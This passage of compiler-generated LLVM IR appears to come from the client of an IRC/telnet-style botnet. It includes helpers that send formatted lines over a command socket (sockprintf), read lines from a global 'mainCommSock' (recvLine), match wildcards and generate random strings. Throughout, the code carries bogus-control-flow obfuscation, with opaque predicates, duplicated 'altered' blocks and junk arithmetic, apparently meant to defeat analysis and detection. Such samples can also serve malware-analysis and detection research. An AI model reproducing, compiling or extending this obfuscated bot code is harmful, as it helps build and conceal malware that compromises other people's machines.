  %192 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %192, i32 45)
  %193 = load i32, i32* %28, align 4
  %_12 = shl i32 %193, 1
  %_13 = shl i32 %193, 1
  %_14 = sub i32 %193, 1
  %gen15 = mul i32 %_14, 1
  %_16 = shl i32 %193, 1
  %_17 = sub i32 0, %193
  %gen18 = add i32 %_17, 1
  %_19 = shl i32 %193, 1
  %_20 = sub i32 %193, 1
  %gen21 = mul i32 %_20, 1
  %_22 = sub i32 %193, 1
  %gen23 = mul i32 %_22, 1
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %28, align 4
  %195 = load i32, i32* %21, align 4
  %_24 = sub i32 0, %195
  %gen25 = add i32 %_24, -1
  %_26 = sub i32 0, %195
  %gen27 = add i32 %_26, -1
  %_28 = shl i32 %195, -1
  %196 = add nsw i32 %195, -1
  store i32 %196, i32* %21, align 4
  br label %originalBB11
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.486, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %86 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %69
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %108

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %65

; <label>:19:                                     ; preds = %13
  %20 = load i32, i32* @x.43
  %21 = load i32, i32* @y.44
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %5, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp ne i32 %30, 0
  %32 = load i32, i32* @x.43
  %33 = load i32, i32* @y.44
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %31, label %40, label %63

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.43
  %42 = load i32, i32* @y.44
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i8*, i8** %4, align 8
  %50 = load i8*, i8** %5, align 8
  %51 = getelementptr inbounds i8, i8* %50, i64 1
  %52 = call i32 @wildString(i8* %49, i8* %51)
  %53 = icmp ne i32 %52, 0
  %54 = xor i1 %53, true
  %55 = load i32, i32* @x.43
  %56 = load i32, i32* @y.44
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br label %63

; <label>:63:                                     ; preds = %originalBBpart27, %originalBBpart2
  %64 = phi i1 [ false, %originalBBpart2 ], [ %54, %originalBBpart27 ]
  br label %65

; <label>:65:                                     ; preds = %63, %13
  %66 = phi i1 [ true, %13 ], [ %64, %63 ]
  %67 = xor i1 %66, true
  %68 = zext i1 %67 to i32
  store i32 %68, i32* %3, align 4
  br label %108

; <label>:69:                                     ; preds = %2
  %70 = load i8*, i8** %5, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %69
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8*, i8** %5, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = call i32 @wildString(i8* %76, i8* %78)
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br label %82

; <label>:82:                                     ; preds = %74, %69
  %83 = phi i1 [ false, %69 ], [ %81, %74 ]
  %84 = xor i1 %83, true
  %85 = zext i1 %84 to i32
  store i32 %85, i32* %3, align 4
  br label %108

; <label>:86:                                     ; preds = %2
  %87 = load i8*, i8** %4, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = call i32 @toupper(i32 %89) #9
  %91 = load i8*, i8** %5, align 8
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = call i32 @toupper(i32 %93) #9
  %95 = icmp eq i32 %90, %94
  br i1 %95, label %96, label %104

; <label>:96:                                     ; preds = %86
  %97 = load i8*, i8** %4, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = call i32 @wildString(i8* %98, i8* %100)
  %102 = icmp ne i32 %101, 0
  %103 = xor i1 %102, true
  br label %104

; <label>:104:                                    ; preds = %96, %86
  %105 = phi i1 [ false, %86 ], [ %103, %96 ]
  %106 = xor i1 %105, true
  %107 = zext i1 %106 to i32
  store i32 %107, i32* %3, align 4
  br label %108

; <label>:108:                                    ; preds = %104, %82, %65, %9
  %109 = load i32, i32* %3, align 4
  ret i32 %109

originalBBalteredBB:                              ; preds = %originalBB, %19
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp ne i32 %112, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %114 = load i8*, i8** %4, align 8
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 1
  %117 = call i32 @wildString(i8* %114, i8* %116)
  %118 = icmp ne i32 %117, 0
  %_ = sub i1 %118, true
  %gen = mul i1 %_, true
  %_2 = sub i1 %118, true
  %gen3 = mul i1 %_2, true
  %_4 = sub i1 false, %118
  %gen5 = add i1 %_4, true
  %119 = xor i1 %118, true
  br label %originalBB1
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.45
  %15 = load i32, i32* @y.46
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.45
  %23 = load i32, i32* @y.46
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2, %12
  %31 = load i32, i32* %3, align 4
  ret i32 %31

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.47
  %21 = load i32, i32* @y.48
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.47
  %31 = load i32, i32* @y.48
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:38:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %39 = load i32, i32* %5, align 4
  %_ = sub i32 %39, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %39
  %gen2 = add i32 %_1, 1
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %5, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %150

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %113, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %133

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @x.49
  %55 = load i32, i32* @y.50
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %53
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  %64 = load i32, i32* @x.49
  %65 = load i32, i32* @y.50
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %72

; <label>:72:                                     ; preds = %originalBBpart2
  %73 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %73, i64 0, i64 0
  %75 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %74) #5, !srcloc !3
  %76 = extractvalue { i64, i64* } %75, 0
  %77 = extractvalue { i64, i64* } %75, 1
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %14, align 4
  %79 = ptrtoint i64* %77 to i64
  %80 = trunc i64 %79 to i32
  store i32 %80, i32* %15, align 4
  br label %81

; <label>:81:                                     ; preds = %72
  %82 = load i32, i32* @x.49
  %83 = load i32, i32* @y.50
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %81
  %90 = load i32, i32* %5, align 4
  %91 = srem i32 %90, 64
  %92 = zext i32 %91 to i64
  %93 = shl i64 1, %92
  %94 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %95 = load i32, i32* %5, align 4
  %96 = sdiv i32 %95, 64
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [16 x i64], [16 x i64]* %94, i64 0, i64 %97
  %99 = load i64, i64* %98, align 8
  %100 = or i64 %99, %93
  store i64 %100, i64* %98, align 8
  %101 = load i32, i32* %5, align 4
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %103, i32* %12, align 4
  %104 = icmp sle i32 %103, 0
  %105 = load i32, i32* @x.49
  %106 = load i32, i32* @y.50
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart242, label %originalBB1alteredBB

originalBBpart242:                                ; preds = %originalBB1
  br i1 %104, label %113, label %116

; <label>:113:                                    ; preds = %originalBBpart242
  %114 = load i32, i32* %13, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %13, align 4
  br label %50

; <label>:116:                                    ; preds = %originalBBpart242
  %117 = load i32, i32* @x.49
  %118 = load i32, i32* @y.50
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %116
  %125 = load i32, i32* @x.49
  %126 = load i32, i32* @y.50
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %133

; <label>:133:                                    ; preds = %originalBBpart246, %50
  %134 = load i32, i32* @x.49
  %135 = load i32, i32* @y.50
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %133
  %142 = load i32, i32* @x.49
  %143 = load i32, i32* @y.50
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %150

; <label>:150:                                    ; preds = %originalBBpart250, %33
  store i32 0, i32* %18, align 4
  %151 = load i8*, i8** %6, align 8
  store i8* %151, i8** %17, align 8
  br label %152

; <label>:152:                                    ; preds = %202, %150
  %153 = load i32, i32* %7, align 4
  %154 = add nsw i32 %153, -1
  store i32 %154, i32* %7, align 4
  %155 = icmp sgt i32 %153, 1
  br i1 %155, label %156, label %205

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* @x.49
  %158 = load i32, i32* @y.50
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %156
  %165 = load i32, i32* @mainCommSock, align 4
  %166 = call i64 @recv(i32 %165, i8* %16, i64 1, i32 0)
  %167 = icmp ne i64 %166, 1
  %168 = load i32, i32* @x.49
  %169 = load i32, i32* @y.50
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %167, label %176, label %194

; <label>:176:                                    ; preds = %originalBBpart254
  %177 = load i32, i32* @x.49
  %178 = load i32, i32* @y.50
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %176
  %185 = load i8*, i8** %17, align 8
  store i8 0, i8* %185, align 1
  store i32 -1, i32* %4, align 4
  %186 = load i32, i32* @x.49
  %187 = load i32, i32* @y.50
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %224

; <label>:194:                                    ; preds = %originalBBpart254
  %195 = load i8, i8* %16, align 1
  %196 = load i8*, i8** %17, align 8
  %197 = getelementptr inbounds i8, i8* %196, i32 1
  store i8* %197, i8** %17, align 8
  store i8 %195, i8* %196, align 1
  %198 = load i8, i8* %16, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 10
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %194
  br label %205

; <label>:202:                                    ; preds = %194
  %203 = load i32, i32* %18, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %18, align 4
  br label %152

; <label>:205:                                    ; preds = %201, %152
  %206 = load i32, i32* @x.49
  %207 = load i32, i32* @y.50
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %205
  %214 = load i8*, i8** %17, align 8
  store i8 0, i8* %214, align 1
  %215 = load i32, i32* %18, align 4
  store i32 %215, i32* %4, align 4
  %216 = load i32, i32* @x.49
  %217 = load i32, i32* @y.50
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %224

; <label>:224:                                    ; preds = %originalBBpart262, %originalBBpart258
  %225 = load i32, i32* %4, align 4
  ret i32 %225

originalBBalteredBB:                              ; preds = %originalBB, %53
  %226 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %226, align 8
  %227 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %227, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %81
  %228 = load i32, i32* %5, align 4
  %_ = shl i32 %228, 64
  %_2 = sub i32 %228, 64
  %gen = mul i32 %_2, 64
  %_3 = sub i32 %228, 64
  %gen4 = mul i32 %_3, 64
  %_5 = sub i32 0, %228
  %gen6 = add i32 %_5, 64
  %_7 = sub i32 %228, 64
  %gen8 = mul i32 %_7, 64
  %_9 = sub i32 %228, 64
  %gen10 = mul i32 %_9, 64
  %229 = srem i32 %228, 64
  %230 = zext i32 %229 to i64
  %_11 = shl i64 1, %230
  %_12 = sub i64 1, %230
  %gen13 = mul i64 %_12, %230
  %231 = shl i64 1, %230
  %232 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %233 = load i32, i32* %5, align 4
  %_14 = shl i32 %233, 64
  %_15 = shl i32 %233, 64
  %_16 = sub i32 0, %233
  %gen17 = add i32 %_16, 64
  %_18 = sub i32 %233, 64
  %gen19 = mul i32 %_18, 64
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %232, i64 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %_20 = sub i64 %237, %231
  %gen21 = mul i64 %_20, %231
  %_22 = sub i64 0, %237
  %gen23 = add i64 %_22, %231
  %_24 = sub i64 0, %237
  %gen25 = add i64 %_24, %231
  %_26 = sub i64 0, %237
  %gen27 = add i64 %_26, %231
  %_28 = shl i64 %237, %231
  %_29 = sub i64 %237, %231
  %gen30 = mul i64 %_29, %231
  %_31 = sub i64 %237, %231
  %gen32 = mul i64 %_31, %231
  %238 = or i64 %237, %231
  store i64 %238, i64* %236, align 8
  %239 = load i32, i32* %5, align 4
  %_33 = sub i32 0, %239
  %gen34 = add i32 %_33, 1
  %_35 = shl i32 %239, 1
  %_36 = shl i32 %239, 1
  %_37 = sub i32 %239, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 0, %239
  %gen40 = add i32 %_39, 1
  %240 = add nsw i32 %239, 1
  %241 = call i32 @select(i32 %240, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %241, i32* %12, align 4
  %242 = icmp sle i32 %241, 0
  br label %originalBB1

originalBB44alteredBB:                            ; preds = %originalBB44, %116
